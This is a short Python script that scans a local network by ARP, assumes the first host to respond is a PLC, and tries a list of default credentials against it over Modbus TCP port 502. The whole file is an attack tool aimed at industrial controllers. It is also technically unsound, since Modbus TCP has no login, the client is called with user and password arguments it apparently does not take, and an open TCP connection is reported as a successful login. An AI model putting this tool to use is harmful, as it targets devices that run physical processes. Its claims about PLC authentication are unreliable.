from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient

# List of known default credentials for PLCs
default_credentials = [
    ("admin", "admin"),  # Common default creds
    ("admin", "password"),
    ("administrator", "admin"),
    ("root", "root"),
    ("user", "user"),
]

def find_plc(ip_range="192.168.1.0/24"):
    """Scan the network to find the PLC's IP address."""
    print("[*] Scanning network for PLC devices...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(request, timeout=2, verbose=False)

    for _, received in answered:
        ip = received.psrc
        print(f"[+] Possible device detected: {ip}")
        
        # You may refine this check based on MAC OUI matching PLC vendors
        return ip  # Return first detected IP (assuming it's the PLC)

    print("[-] No PLC detected in network.")
    return None

def attempt_plc_auth(ip):
    """Attempt authentication using default credentials."""
    print(f"[*] Attempting authentication on PLC at {ip}...")

    for username, password in default_credentials:
        print(f"[+] Trying credentials: {username} / {password}")

        # Attempt to connect to the PLC using Modbus TCP (or other applicable protocol)
        plc_client = ModbusClient(host=ip, port=502, user=username, passwd=password)
        
        if plc_client.open():  # If connection is successful
            print(f"[!!] Authentication successful with {username}:{password} on {ip}")
            plc_client.close()
            return True
        else:
            print("[-] Authentication failed.")

    print("[!] Exhausted default credentials, could not authenticate.")
    return False

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc()

    if plc_ip:
        attempt_plc_auth(plc_ip)
    else:
        print("[-] Could not find any PLC on the network.")